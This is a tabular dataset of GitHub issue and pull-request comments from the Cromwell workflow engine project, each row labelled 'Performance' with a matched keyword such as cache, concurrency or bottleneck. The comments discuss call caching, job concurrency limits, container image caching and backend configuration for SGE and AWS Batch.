Performance,@mcovarr I also echo @cwhelan that the solution provided is quite cumbersome. What exactly would be the complexity in devising a solution where instead you could simply define a variable like `backend.providers.#name.config.root` (say for example `backend.providers.#name.config.cache`) that indicates where the docker images should be cached and maybe an option to specify whether downloading the image in the cache directory is something that needs to be done for all tasks or only for scattered tasks. I don't see why it should be left to the user to perform the caching manually. This would be more similar to what was hacked for the shared filesystem backend in #5063 and maybe a more general solution non-specific to the PAPIv2 backend would eliminate the need for such a hack. The problem still remains that developers would need to rely on users to configure Cromwell appropriately. If I could have it my way I would say that docker images should always be cached within scattered tasks (or at least this being a default behavior that can be modified),MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-1246208182:279,cache,cache,279,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6442#issuecomment-1246208182,10,"['cache', 'perform']","['cache', 'cached', 'perform']"
Performance,"@mcovarr I think we still need to ensure that the submission is correct before sending back a 201 with the workflow ID, which means being sure that everything necessary to start executing the workflow is ready (all DB executions succeeded etc...); @kshakir I see your point, however in this case I don't think having the ask timing out is a problem, if a WorkflowActor takes forever to initialize itself then there is actually some bottleneck further down, and it might even be better to say ""sorry but we're really too busy right now, retry later"", than keeping waiting for WorkflowActors, which is going to trigger a timeout anyway since this comes from the ""submit endpoint"" and spray is not going to wait forever either.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/308#issuecomment-161985376:432,bottleneck,bottleneck,432,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/308#issuecomment-161985376,1,['bottleneck'],['bottleneck']
Performance,"@mcovarr Well okay then. Let this remain a singleton as we discussed in the meeting. Later on, if we feel it's a bottleneck, we can make it a kinda router or something.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/548#issuecomment-196540539:113,bottleneck,bottleneck,113,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/548#issuecomment-196540539,1,['bottleneck'],['bottleneck']
Performance,@mcovarr any chance of getting it re-released as 28.1 or 29? Unfortunately users will just get a checksum mismatch error if the jar is already in their cache since cromwell is `bottle :unneeded`.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2463#issuecomment-316010288:152,cache,cache,152,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2463#issuecomment-316010288,1,['cache'],['cache']
Performance,@mcovarr because sometimes they were getting `attempt-1`s and sometime call cached. I _think_ that the workflows must have been copy/pasted from elsewhere in the test suite and it was a coin toss on which was running first.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5429#issuecomment-590992581:76,cache,cached,76,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5429#issuecomment-590992581,1,['cache'],['cached']
Performance,"@mcovarr re concurrency testing I still think that's _way_ too overkill. There should be no forced timings, scraping of logs, etc. We know that Calls are wrapped by independent CallActors. As long as multiple CallActors are informed of their startable status by the same event, that's all we need to demonstrate.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/20#issuecomment-103264851:12,concurren,concurrency,12,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/20#issuecomment-103264851,1,['concurren'],['concurrency']
Performance,"@meganshand Sweet, I'm going to close. Out of curiosity do you have any before/after in terms of how long running the wdl took (again, sans call caching)? I'm trying to get a sense of the real world magnitude of the performance improvement for this.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1938#issuecomment-289040489:216,perform,performance,216,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1938#issuecomment-289040489,1,['perform'],['performance']
Performance,"@meganshand commented on [Fri Apr 29 2016](https://github.com/broadinstitute/wdltool/issues/9). The following task results in an uninformative error message when using `validate`: . ```; task printReads {; File bam; File ref_fasta; File ref_fasta_index; File ref_dict. command {; java -jar /usr/gitc/GenomeAnalysisTK.jar \; -T PrintReads \; -I ${bam} \; -o smaller.bam \; -L chr1 \; -R ${ref_fasta}; }; runtime {; docker: ""broadinstitute/genomes-in-the-cloud:1.1010_with_gatk3.5""; disks: ""local-disk 400 SSD""; memory: ""10 GB""; }; output {; File smaller = smaller.bam; }; }; ```. results in this error message:. ```; SLF4J: Failed to load class ""org.slf4j.impl.StaticLoggerBinder"".; SLF4J: Defaulting to no-operation (NOP) logger implementation; SLF4J: See http://www.slf4j.org/codes.html#StaticLoggerBinder for further details.; ```. The problem is that there aren't quotes around ""smaller.bam"" in the outputs of the task. It would be great if the error message could tell you which line or object was causing the problem. The error message from cromwell is different, but also uninformative and it would be great if the error message could be clearer there as well.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2875:633,load,load,633,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2875,1,['load'],['load']
Performance,"@meganshand when call caching was on, you said it was using file paths, what about [call cache copying](https://github.com/broadinstitute/cromwell/blob/develop/core/src/main/resources/reference.conf#L214) ? Is it full copying or (soft/hard) linking ?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1938#issuecomment-289051846:89,cache,cache,89,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1938#issuecomment-289051846,1,['cache'],['cache']
Performance,"@myazinn You can restart the tests by going to the ""checks"" tab on this PR and restarting failed tests that way, no need to reset the PR. We do have a number of flaky tests, unfortunately. There are a lot of things which rely on timing in a concurrent environment which we haven't rooted out. I'm pretty skeptical that the test fix you pushed is actually correct unless it very recently changed - more likely is that something is timing out before the test can properly complete and the incorrect value is coming through.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5104#issuecomment-519088990:241,concurren,concurrent,241,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5104#issuecomment-519088990,1,['concurren'],['concurrent']
Performance,"@natechols - so it works well for failed jobs. However, there seems to be some transient errors on our HPC that occur randomly and qsub/qstat go down temporarily and result in `failed (during ExecutingWorkflowState): java.lang.RuntimeException: Unable to start job.`. I was hoping this would retry failed submissions. . This is my current config:. ```; include required(classpath(""application"")). webservice {; port = 8000; interface = 127.0.0.1; }. #call-caching {; # enabled = true; # invalidate-bad-cache-results = true; #}. system {; job-rate-control {; jobs = 20; per = 1 second; }; }. backend {; default = SGE. providers {; Local {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory"". config {; concurrent-job-limit = 10; root = ""cromwell-executions""; run-in-background = true. default-runtime-attributes {; maxRetries: 3; }. runtime-attributes = """"""; String ? docker; String ? docker_user; """""". submit = ""/bin/bash ${script}"". submit-docker = """"""; docker run \; --rm -i \; ${""--user "" + docker_user} \; --entrypoint /bin/bash \; -v ${cwd}:${docker_cwd} \; ${docker} ${script}; """""". filesystems {; local {; localization: [; ""hard-link"", ""soft-link"", ""copy""; ]; caching {; duplication-strategy: [; ""hard-link"", ""soft-link"", ""copy""; ]; hashing-strategy: ""file""; check-sibling-md5: false; }; }; }; }; }. SGE {; actor-factory = ""cromwell.backend.impl.sfs.config.ConfigBackendLifecycleActorFactory"". config {; root = ""cromwell-executions""; exit-code-timeout-seconds = 600; concurrent-job-limit = 100. default-runtime-attributes {; maxRetries: 3; }. runtime-attributes = """"""; Int cpu = 1; Float ? memory_gb; String sge_queue = ""dgdcloud.q""; String ? sge_project; """""". submit = """"""; qsub \; -terse \; -V \; -b n \; -N ${job_name} \; -wd ${cwd} \; -o ${out}.qsub \; -e ${err}.qsub \; -pe smp ${cpu} \; ${""-l h_vmem="" + memory_gb / cpu + ""g""} \; ${""-l mem_free="" + memory_gb / cpu + ""g""} \; ${""-q "" + sge_queue} \; ${""-P "" + sge_project} \; ${script}; """""". kill = ""qdel",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/2176#issuecomment-511529362:502,cache,cache-results,502,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/2176#issuecomment-511529362,2,"['cache', 'concurren']","['cache-results', 'concurrent-job-limit']"
Performance,"@olsonanl I think it depends on the version - I think(?) in newer versions a singularity hub image is cached, but (from actual experience) in _some_ version it's definitely not!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5063#issuecomment-537243320:102,cache,cached,102,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5063#issuecomment-537243320,1,['cache'],['cached']
Performance,@pgrosu I can assure you that nobody would like to see cromwell have the ability to scale to infinity and beyond on any arbitrary backend more than I :) OTOH I need to empower people to at least crawl prior to building out the running capability. Could we put together something which would provide better scalability for our purposes? Probably. However they have people who know this stuff a lot better than I do and we've got many other things on the todo list so for now the best course of action appears to be working w/ them to help parallelize our efforts.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1665#issuecomment-260645161:306,scalab,scalability,306,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1665#issuecomment-260645161,1,['scalab'],['scalability']
Performance,@rhpvorderman @DavyCats -- did `mergeLibraries` cache? Would you mind posting the outputs of that task from the first/second run?,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3717#issuecomment-395070381:48,cache,cache,48,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3717#issuecomment-395070381,1,['cache'],['cache']
Performance,"@rhpvorderman I have tried running cromwell with the `--metadata-output` flag. That's indicated in the JIRA issue.; For the tasks that fail to activate call caching I get the following metadata entry:; ```; ""callCaching"": {; ""allowResultReuse"": false,; ""effectiveCallCachingMode"": ""CallCachingOff"",; ""hit"": false,; ""result"": ""Cache Miss""; }; ```",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5405#issuecomment-589857972:326,Cache,Cache,326,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5405#issuecomment-589857972,1,['Cache'],['Cache']
Performance,"@rhpvorderman ^^ would just need to keep in mind they do the lookup to get the docker size. After BCC2020 I want to revisit this PR, and could allow you to turn off the digest but keep call caching on?. The only catch i imagine is that you'd get a cache miss if you ran with / without that flag (as a digest vs floating tag would miss). I don't know for sure other technical challenges apart from that. --. My Scala is poor, so can only do minimal code level changes.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5545#issuecomment-660996406:248,cache,cache,248,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5545#issuecomment-660996406,1,['cache'],['cache']
Performance,@rhpvorderman which backend are you using? I assume a SGE-like system. Do you have trouble with the qstat -j requests causing high load? Have you already implemented a similar system to the linked script?. The problem with just increasing this value is that it also slows checking for the rc file.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/4905#issuecomment-488880044:131,load,load,131,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/4905#issuecomment-488880044,1,['load'],['load']
Performance,"@ruchim Just want to say that I was looking for exactly this functionality (having different cromwells share a workflow database). Seems like it's still being developed; thanks for working on it. It would be most useful if combined with #4616 (caching results across engines). I could then run some Cromwell analyses on Broad's UGER cluster or Harvard's Odyssey cluster (where it doesn't cost extra), and other analyses on AWS or GCS, and have a shared database with reuse of cached results. If real-time database sharing is hard to make work, it would be enough to add a Cromwell command to import another Cromwell's database into its own, as an offline operation when no analyses are being run.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4370#issuecomment-468020886:476,cache,cached,476,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4370#issuecomment-468020886,1,['cache'],['cached']
Performance,"@ruchim This is not really a concern for us. We run our workflows on a local SGE cluster, therefore the consequence of requesting more memory than necessary is only that other jobs may be slower to run (longer queue time), but there isn't neccessarily a (direct) monetary cost for requesting more resources. I also don't believe that there is regularly a shortage of memory on our cluster.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4346#issuecomment-435056303:210,queue,queue,210,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4346#issuecomment-435056303,1,['queue'],['queue']
Performance,"@ruchim `mergeLibraries` would be run after the indexing step which is not getting call-cached, so no it would not get cached (or at least it will get rerun). I assume you're asking about this call because its output is given to the `mergedIndex` call. This is a different indexing step from the one I was referring to (`samtoolsIndex` in https://github.com/biowdl/aligning/tree/BIOWDL-25). Actually, `mergeLibraries` doesn't get run at all, because there is only one bam file (notice the if statement surrounding the call). `linkBam` is called instead at this point. If you're wondering about the input for the `samtoolsIndex` call, yes that call (`star`) gets cached.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3717#issuecomment-395080386:88,cache,cached,88,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3717#issuecomment-395080386,3,['cache'],['cached']
Performance,"@salonishah11 I think you introduced the `sortBy` in https://github.com/broadinstitute/cromwell/pull/6325 so I wanted to make sure I'm not missing something essential by removing it. See [ticket](https://broadworkbench.atlassian.net/browse/BW-692) for my reasoning, tl;dr significant performance gain.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6349:284,perform,performance,284,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6349,1,['perform'],['performance']
Performance,"@seandavi - implementing the config suggested by @TimurIs and removing the specification of `concurrent-job-limit` I was able to run the following workflow with out issue. ```; task t {; Int id; command { echo ""scatter index = ${id}"" }; runtime {; docker: ""ubuntu:latest""; cpu: 1; memory: ""512MB""; }; output { String out = read_string(stdout()) }; }. workflow w {; Array[Int] arr = range(1000); scatter(i in arr) { call t { input: id = i } }; output { Array[String] t_out = t.out }; }; ```. Approximate numbers:; * max # jobs observed in ""submitted"" state = 250 - 270; * max # jobs observed in ""running"" state = 20-30",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4303#issuecomment-443399747:93,concurren,concurrent-job-limit,93,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4303#issuecomment-443399747,1,['concurren'],['concurrent-job-limit']
Performance,"@seandavi Ah, it's something @kcibul whipped up which runs on google app engine which presents the JES API for trivial tasks - we've been using it to be able to run things which test the cromwell engine under load w/o having need to run up a large bill (or run into quota issues!) on JES. I've been starting to use it heavily and have run into some weird issues, such as this ticket and those unexpected actor death notifications from the other issue. I've been theorizing that they're due to responses from appengine which we don't see in JES but i need to verify that - and clearly that's not the case w/ the unexpected actor death ones.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1662#issuecomment-260527636:209,load,load,209,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1662#issuecomment-260527636,2,['load'],['load']
Performance,"@seandavi I know that GCS != S3, but when I had a brief look at the [source](https://github.com/broadinstitute/cromwell/blob/3b29af0d8f116d63e1fcb85f5b4903fd615a5386/engine/src/main/scala/cromwell/server/CromwellRootActor.scala#L89) where that configuration `io` block is being used, `number-of-requests` is used to set a throttle on a fairly low-level Actor that at least at might be used by the AWS batch backend... I haven't looked at the implementation in detail. I'll do that tomorrow.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4303#issuecomment-436944065:322,throttle,throttle,322,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4303#issuecomment-436944065,1,['throttle'],['throttle']
Performance,"@tAndreani `cpu` isn't a supported `runtime` value in the local backend (really, very few of them are). With the local backend Cromwell won't limit the resource usage of any job. We view the local backend more as a developmental/experimentation tool than something to be used in a real world scenario, so there's less attention paid to that sort of thing. The concurrent job limit could be used here as well.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1491#issuecomment-517051507:360,concurren,concurrent,360,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1491#issuecomment-517051507,1,['concurren'],['concurrent']
Performance,"@tAndreani in terms of cromwell there's not a limit per se, although your underlying backend might get grouchy at you if you wind up submitting too many jobs. You could set the `concurrent-job-limit` config field to help with this if you do wind up with issues",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1491#issuecomment-513922676:178,concurren,concurrent-job-limit,178,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1491#issuecomment-513922676,1,['concurren'],['concurrent-job-limit']
Performance,"@tcibinan Thanks for the contribution! To expectation set, we'll aim to review your PR within a reasonable timeframe but we unfortunately can't make any firm guarantees of the timeline since we're always working to internal deadlines of our own!. My initial thought is:; 1. Since the filesystem is something that Cromwell cannot have any control over, a number of its assumptions might be invalidated (depending on how the workflow author uses the filesystem). That's probably fine, as long as both the author and the workflow runner are aware of it and can work around it.; 2. We probably want to have our own version of ""pre-computed inputs mounted by fuse"" with some more controls around the problems mentioned in (1.) to help keep our assumptions correct.; 3. None of those points are any worse than passing in `gs://` paths as strings and localizing them manually, so we shouldn't disallow people opting-in to fuse support like this if they really want to. Could you add some additional warning comments along these lines?; 1. Any inputs brought in via a Fuse filesystem will not be considered for call caching.; 1. Any outputs stored via a Fuse filesystem will not be recreated if a task is replayed from a call-cache hit.; 1. If the filesystem is writable, your job is potentially no longer idempotent - Cromwell may decide to retry your job for you, and you might get unforeseen file collisions or even incorrect results if that happens.; 1. This is a community contribution and not officially supported (at least not yet!) by the Cromwell team?. @ruchim I know you were looking at Fuse integration too. Do you have any thoughts on this?. Thanks!",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5343#issuecomment-572896597:1218,cache,cache,1218,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5343#issuecomment-572896597,1,['cache'],['cache']
Performance,"@tom-dyar @elerch Current assumption is that you have valid AWS Batch Job Queue with a Compute Environment, and a AWS S3 bucket for results. Associated with these are IAM instance and task roles, VPC, etc. We will be providing tutorials on this pre-Cromwell requirements soon (weeks). . The AWS conf file just needs the job queue ARN. And the S3 bucket.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395557543:74,Queue,Queue,74,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/3736#issuecomment-395557543,2,"['Queue', 'queue']","['Queue', 'queue']"
Performance,"@vdauwera I spotted the issue but it was @kshakir who ended up resolving it. I believe this had to do with the auth that was used to perform the read_* function, and not having access to the proper google credentials. I checked the [config](https://github.com/googlegenomics/pipelines-api-examples/blob/master/wdl_runner/cromwell_launcher/jes_template.conf) wdl_runner uses and I believe it's missing the goolge.auths key and the engine.filesystem.gcs.auth key in the config, which is probably what Cromwell requires to parse gcs files.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/1801#issuecomment-295735165:133,perform,perform,133,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/1801#issuecomment-295735165,1,['perform'],['perform']
Performance,"@vsoch Thanks for testing this! This was indeed a major oversight on my behalf. . I did some further testing:. + It does not matter if you use a hashed container. Singularity will still look it up on the internet.; + The singularity cache does not store the file in an easily retrievable way:. ```; ~/.singularity/cache/oci-tmp/7c7e798af52365c2fa3c1c4606dcf8c1e2d5e502f49f1185d774655648175308$ ls; fastqc_0.11.9--0.sif fastqc@sha256_319b8d4eca0fc0367d192941f221f7fcd29a6b96996c63cbf8931dbb66e53348.sif; ```; You would have to hack with find etc. Dammit, this means this solution only works for fully connected nodes. And it means an alternate (more robust) solution needs to be hacked together in bash :scream: . On the other hand, I feel this could be fixed easily by singularity having a `--use-cache-first` flag, so it checks the cache first instead of checking the internet. I will investigate what is possible upstream.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5515#issuecomment-631329498:233,cache,cache,233,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5515#issuecomment-631329498,4,['cache'],"['cache', 'cache-first']"
Performance,@vsoch This config already does this by using exec. This way the binary image is created in the singularity cache dir.,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5515#issuecomment-630780758:108,cache,cache,108,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5515#issuecomment-630780758,1,['cache'],['cache']
Performance,"@vsoch and @illusional I have processed your comments. I made it more clear why the `--containall` flag is so important and I dropped the list of stuff that Singularity does without the flag. Instead I focused on the way Singularity affects reproducibility and how this can be prevented by the containall flag. I have also removed any references to a particular version of Singularity, and provided alternatives for module load.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/5515#issuecomment-628453342:423,load,load,423,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/5515#issuecomment-628453342,2,['load'],['load']
Performance,"@wleepang , We're scattering by chromosome for any step using a scatter, so 25 concurrent jobs/sample. The number of simultaneous samples run at a time varies from 1-100+ depending on needs, and we're using multiple workflows, but some sub-wdls are shared between the larger workflows. And I'm not sure I really understand why a new job definition must be made for every call. I presume you're submitting jobs using a submit_job() API call where you can specify container overrides and set unique mount points versus having them pre-established in a job definition and calling that without any modification? . Scala is not my language so how those calls are being made and how the determination of whether or not a job definition already exists (regardless of it being correct in light of this bug) is not something I can easily determine.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5004#issuecomment-504128934:79,concurren,concurrent,79,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5004#issuecomment-504128934,1,['concurren'],['concurrent']
Performance,"@wleepang I am little bit confused by concurrent-job-limit. Does this option means limit of the concurrent AWS Batch underlying computing jobs or limit of concurrent API calls to AWS Batch? This is totally different. Say, if I have 1000 samples and one job per sample, I would expect 1000 concurrent AWS Batch job (Array job with size of 1000), if it can not handle even 16 samples concurrently, it will make no sense for batch mode. If it means latter, although the limit is 16 API calls per second (let's assume concurrent jobs unit is per second), you can still submit an array job per API call which supports concurrent 1000 samples computing jobs under the hood since the concurrent number of API calls is not equal (actually not related to) the concurrent computing jobs launched by AWS Batch with which you can submit/query all jobs/jobs status in an array job with one api call.; One more question: my understanding is that AWS Batch backend will convert scatter jobs into an array job of AWS Batch, is that right?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4303#issuecomment-440747628:38,concurren,concurrent-job-limit,38,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4303#issuecomment-440747628,9,['concurren'],"['concurrent', 'concurrent-job-limit', 'concurrently']"
Performance,"@yfarjoun Yeah, I agree. @vdauwera quickly provided a totally valid use case beyond ""I'm screwing around"". Specifically what I was concerned about here is providing a case where we allow corners to be cuttable for the implementer which then leave loaded guns sitting around for downstream users to shoot themselves with.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2565#issuecomment-323832814:247,load,loaded,247,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2565#issuecomment-323832814,1,['load'],['loaded']
Performance,"@yfarjoun You're always using a DB, so what you're doing is using an in memory DB. Note that I've found that MySQL gives better performance. When you run against GCS are you also using the default in memory DB?. Are they both the same version? If so, what version. If develop, from when?. I did recently make some changes to develop that should tremendously help what this *might* be but there are also spots which are a lot more single threaded than one would like and it's possible you've found yourself in a situation where that's true on the SFS backend but not JES.",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1938#issuecomment-276766802:128,perform,performance,128,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1938#issuecomment-276766802,1,['perform'],['performance']
Performance,"A SFS backend-specific actor to replace the BJEA in case of a call cache hit.; - [ ] The EJEA should create an instance of this instead of a BJEA, if a call cache hit has occurred; - [ ] Given a BackendJobDescriptor and a CCRID (see #1224), should copy results as appropriate and send a BackendJobExecutionResponse to the EJEA.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1236:67,cache,cache,67,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1236,2,['cache'],['cache']
Performance,"A backend-specific actor to replace the BJEA in case of a call cache hit.; - [ ] The EJEA should create an instance of this instead of a BJEA, if a call cache hit has occurred; - [ ] Given a BackendJobDescriptor and a CCRID (see #1224), should copy results as appropriate and send a BackendJobExecutionResponse to the EJEA.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1233:63,cache,cache,63,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1233,2,['cache'],['cache']
Performance,"A bi-directional loaded gun sounds dangerous, what other ways can users shoot themselves?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1641#issuecomment-325781805:17,load,loaded,17,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1641#issuecomment-325781805,1,['load'],['loaded']
Performance,"A bunch of jobs were finished which Cromwell didn't detect. The context: ; - Trying to run jprofiler to get a profile of the run described in #820. Full stack dump:. ```; Full thread dump Java HotSpot(TM) 64-Bit Server VM (25.60-b23 mixed mode):. ""cromwell-system-akka.actor.default-dispatcher-27"" #115 prio=5 os_prio=31 tid=0x00007fb76d052800 nid=0xf503 waiting on condition [0x0000000135d74000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0021d00> (a akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinPool); at scala.concurrent.forkjoin.ForkJoinPool.scan(ForkJoinPool.java:2075); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). ""ForkJoinPool-3-worker-5"" #82 daemon prio=5 os_prio=31 tid=0x00007fb76cc73800 nid=0xcd03 waiting on condition [0x0000000134661000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c0041f30> (a scala.concurrent.forkjoin.ForkJoinPool); at scala.concurrent.forkjoin.ForkJoinPool.scan(ForkJoinPool.java:2075); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107). ""pool-1-thread-20"" #81 prio=5 os_prio=31 tid=0x00007fb76cc5b800 nid=0xcb03 waiting on condition [0x000000013455e000]; java.lang.Thread.State: WAITING (parking); at sun.misc.Unsafe.park(Native Method); - parking to wait for <0x00000006c1476660> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject); at java.util.concurrent.locks.LockSupport.park(LockSupport.java:175); at java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject.await(AbstractQueuedSynchronizer.java:2039); at java.util.concurrent.LinkedBlockingQueue.take(LinkedBlockingQueue.java:442); at java.util.concurrent.ThreadPoolExecutor.getTask(Th",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/844:598,concurren,concurrent,598,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/844,3,['concurren'],['concurrent']
Performance,A couple of tactical centaur reliability tune-ups [BW-484],MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/6156:41,tune,tune-ups,41,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/6156,1,['tune'],['tune-ups']
Performance,"A few immediate thoughts:. - What's the granularity of this value? ie per workflow, per cromwell server, per task?; - Should this be a ""happens without the end-user knowing"" or an ""end user has to choose"" type of a thing? ; - Or maybe it's ""in Firecloud it must not be overridden but outside of Firecloud it should be more flexible""; - Should this value (wherever it gets specified) be considered when deciding whether or not to call cache to a previous run (which may have been on a different subnet)?",MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4070#issuecomment-418747764:434,cache,cache,434,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4070#issuecomment-418747764,1,['cache'],['cache']
